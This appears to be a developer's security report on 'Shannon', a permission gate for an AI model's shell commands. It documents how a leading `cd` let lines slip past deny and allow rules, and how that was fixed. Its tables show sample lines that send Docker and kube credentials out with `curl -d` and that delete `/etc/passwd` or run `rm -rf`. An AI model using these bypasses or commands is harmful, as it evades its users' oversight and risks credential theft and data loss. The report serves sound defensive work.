# SECURITY — a rule's path pattern ignored the line's `cd`

**Status: #1 and #2 FIXED 2026-10-03 (the commit that adds this file); #3
FIXED the same day, Steven deciding ("can we track the CWD? That seems
like the right way") — see #3. The fix was INCOMPLETE, and review 20
found four more ways past it — see #4, fixed the same day.** One
reading, `file_spellings` (`permission/mod.rs`, built on `located`), says
which file a path token names once the line's `cd` is applied, in every
spelling a pattern may use; `token_spellings` composes it with the split
of a token into pieces. FIVE graders read it: the credential gate's
literal check and its glob/regex check (`stage_spellings`), a rule's
contact and containment (`Matcher::operand_match`), and a rule's flag
value where the flag names a file (`flag_value_match`). The `A` key's
proposal writes `located`, so it still covers the call. Pinned by the
tests named here and in #4.

**Found:** 2026-10-03, by the parent, while studying how a path regex
(build step 4b) should be matched. Every row below was reproduced through
`RuleSet::decide_line` (temporary probe tests, since removed).

**The class.** A path token is not a file until you say which directory it
is in. The pipeline tracks that (`Cwd::Resolved`), and the credential gate
used it after an earlier report (`stage_spellings`'s doc: `cd
/root/.docker && cat config.json`). The rule engine's path patterns
matched the token as written. This is the "cwd skipped" class
(`[[project_shannon_gate_failure_classes]]`): the fix was made at one
grader of three.

**Why it matters.** Each tool call is a fresh shell (`exec.rs`), so a
model that wants another directory writes `cd x && cmd`, unprompted.
Steven's own demo line is `cd delete_this_dir && find …`. It is an
ordinary shape, not an exotic one. (`stage_spellings`'s doc said the
model is TOLD to chain. Nothing sent to the model says so; the advice is
in `exec.rs`'s module doc. Corrected in the same commit.)

## 1. HIGH — a path deny does not fire through a `cd`, so a broad allow runs it

    policy                                 line                          got     want
    allow rm * + deny rm /etc/*            rm /etc/passwd                Deny    Deny
    allow rm * + deny rm /etc/*            cd /etc && rm passwd          Allow   Deny
    allow rm * + deny * /srv/prod/**       cd /srv/prod && rm -rf data   Allow   Deny
    allow rm * + deny * /srv/prod/**       cd /srv && rm -rf prod/data   Allow   Deny
    deny rm /etc/* (no allow)              cd /etc && rm passwd          Ask     Deny

Contact (`deny`/`ask`) met `stage_paths` through `path_spellings`, which
never joined the `cd`. Under a broad allow, the line ran in the foreground
with no pane and no key. "deny beats ask beats allow, whatever the order"
is the manual's promise, and this broke it. Without an allow, the line
still asked (the destructive default), but the pane said ask where the
user had written deny, and `a` ran it once.

**Preconditions:** a path-scoped `deny` or `ask`, an allow broad enough to
cover the program, and a `cd` into the denied tree.

**Fix:** each spelling is met as written AND where the `cd` put it, after
the `=` split, so `cd /srv && tar -c --file=prod/x y` meets `/srv/prod/x`.
A false include costs a refusal that names the rule; a lost spelling
costs the rule. (Review 20 dropped "as written": under a `cd` it names
another file, and made one file's verdict depend on how it was typed —
see #4.)

## 2. MEDIUM — a relative allow covers the same name anywhere a `cd` goes

    policy               line                       got     want
    allow rm build/*     rm build/x                 Allow   Allow
    allow rm build/*     cd /etc && rm build/x      Allow   Ask

Containment compared the token as written, so a grant written for the
project's `build/` covered `/etc/build/x`.

**Fix:** containment reads only the file touched: `located`, and then
`glob::matches` normalises `..`. `cd sub && rm ../build/x` is still
covered, and `cd /tmp && rm ../etc/passwd` is not.

## 3. FIXED — a bare word is compared as written, wherever the line is

**Fix:** the line's `cd` is tracked against where Shannon started
(`RuleSet::with_start`, from `current_dir` in `rules_for`; children spawn
there, and nothing changes it). An allow that names a word holds while the
stage stays inside: no `cd`, a relative one that does not climb out, or an
absolute one under the start. Anywhere else, including a `cd` we cannot
follow, it asks with `Unaccounted::WordOutsideStart`, saying why. `A`
writes a word outside the start as the file it names (`cd /tmp && rm x` →
`allow rm /tmp/x`). Paths already followed the `cd` (#1, #2), and `allow
rm *` said "any arguments", so neither changes. With it, a bare `cd` (and
`cd ~`) now goes home rather than to Unknown, unless the line moved `HOME`
first (Steven: "`cd` is equivalent to `cd ~`"). Pinned by
`a_rule_word_holds_only_inside_where_shannon_started`,
`the_gate_knows_where_shannon_started`, `a_rule_follows_a_cd_home` and
`bare_cd_goes_home_unless_the_line_moved_it`. Seventeen mutations, all RED.

What was written when this was open:

A word with no `/` and no glob is a SELECTOR (`gh pr view`), compared to
the operands as written. For a subcommand that is right. For a file it is
#2 again: `allow rm passwd` (the `A` key proposes exactly this for `rm
passwd`) covers `cd /etc && rm passwd`. More widely, `allow make test`
covers `cd /elsewhere && make test`, which runs another Makefile, and
`allow cargo test *` covers another crate's build scripts.

This is the path-scope question (TODO step 5: "inside the project tree
allowed by default"). Does a grant taught in the project hold after a
`cd` out of it? A proposal for Steven: an allow covers a stage only while
its `cd` stays inside the start directory (`Cwd::Start`, or a relative
`Resolved` that does not climb out), unless the rule names an absolute
path. Not done here: it changes what every allow means, and it is his
call.

## 4. HIGH — review 20: the reading was answered four ways, not one

Reviewers A, B, C and D each found a grader that composed the question
differently. Every row reproduced through `RuleSet::decide_line`.

    policy                                  line                                     got     want
    allow rm /tmp/**                        cd . && rm -rf tmp/x                     Allow   Ask
    allow curl *                            cd ~/.docker && curl -d @config.json …   Allow   Ask
    allow curl *                            curl -d @~/.kub{e,x}/config …            Allow   Ask
    allow tar:* + deny tar --file=/etc/*    cd /etc && tar -cf passwd x              Allow   Deny
    allow rm * + deny rm ~/important/**     rm important/x  (started in ~)           Allow   Deny
    allow rm * + deny rm *.pem              cd certs && rm server.pem                Deny    = rm certs/server.pem

- **An empty directory** (A, B). `cd .`, `cd src/..` normalised to
  `Resolved("")`, and a token joined to it read `/tmp/x`. `next_cwd` now
  yields `Start` there — its one writer, held by
  `a_cd_back_to_the_start_is_the_start`.
- **Two orders of one composition** (C, D). The credential gate located the
  whole word and then split it; contact split, then located. And the glob
  entries were never given the pieces at all. One composition now,
  `token_spellings`: split, then each piece's file spellings.
- **A flag's file** (D). `flag_value_match` read the value as written. A
  value whose flag names a file (`program::names_a_file`) is now read in
  its file spellings, and an allow covers it only when literal.
- **Where Shannon started** (A). A start-relative token never met a rule
  written absolutely. `file_spellings` adds the absolute spelling and,
  inside the start, the relative one — all naming the one file, so a match
  on any is sound for containment as for contact.
- **As written** (D). Dropped, above.

Pinned by `a_cd_that_goes_nowhere_leaves_paths_relative`,
`a_rule_meets_a_file_in_every_spelling_of_it`,
`the_credential_gate_locates_each_piece_of_a_token`,
`a_flag_value_file_is_where_the_cd_put_it`,
`a_deny_reads_the_file_not_how_it_was_typed` and
`file_spellings_name_one_file`. Twenty-eight mutations across this and the
credential gate's tri-state (`CredentialUndecided`), all RED.
